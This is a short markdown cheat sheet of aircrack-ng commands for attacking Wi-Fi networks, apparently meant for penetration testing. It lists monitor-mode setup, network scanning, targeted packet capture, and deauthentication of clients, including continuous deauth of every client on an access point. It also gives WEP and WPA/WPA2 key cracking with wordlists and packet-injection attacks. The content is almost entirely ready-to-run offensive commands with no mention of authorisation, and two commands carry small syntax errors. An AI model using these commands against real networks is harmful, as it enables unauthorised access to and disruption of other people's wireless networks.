#### Set Interface to Monitor Mode
**Enables `monitor mode` on interface wlan0**
```
airmon-ng start wlan0
```

**Stops `monitor mode` and return the interface to managed mode**
```
airmon-ng stop wlan0mon
```

#### Scan Wireless Networks
**Scans for wireless networks and displays BSSID, channel, encryption, and connected clients**
```
airodump-ng wlan0mon
```

#### Capture Packets from a Specific Network
```
airodump-ng -bssid <BSSID> -c <channel> -w <file> wlan0mon
```

#### Deauthenticate a Client (Capture Handshake)
**Sends `deauth packets` to force a client to reconnect, triggering a `4-way handshake`**
```
aireplay-ng --deauth 10 -a <AP_BSSID> -c <CLIENT_MAC) wlan0mon
```

**Sends `continuous deauth` packets to all clients of the AP**
```
aireplay-ng --deauth 0 -a <AP_BSSID> wlan0mon
```

---
### Crack WEP Key
**Cracks WEP keys using captured packets**
```
aircrack-ng -b <BSSID> -w <wordlist> <capturefile>.cap
```

### Crack WPA/WPA2 Key
**Cracks WPA/WPA2 using a `dictionary attack` on the handshake file**
```
aircrack-ng -w <WORDLIST> -b <BSSID> <handshake>.cap
```

### Packet Injection (Fake Authentication/ARP Replay)
**Fake authentication with AP (required for some WEP attacks)**
```
aireplay-ng -1 0 -a <BSSID> -h <YOUR_MAC> wlan0mon
```

**`ARP request replay` attack (for WEP), increases packet capture speed**
```
aireplay-ng -3 -b <BSSID> -h <YOUR_MAC> wlan0mon
```

### Verify Packet Injection
**Tests if injection is working on your wireless card**
```
aireplay-ng -9 wlan0mon
```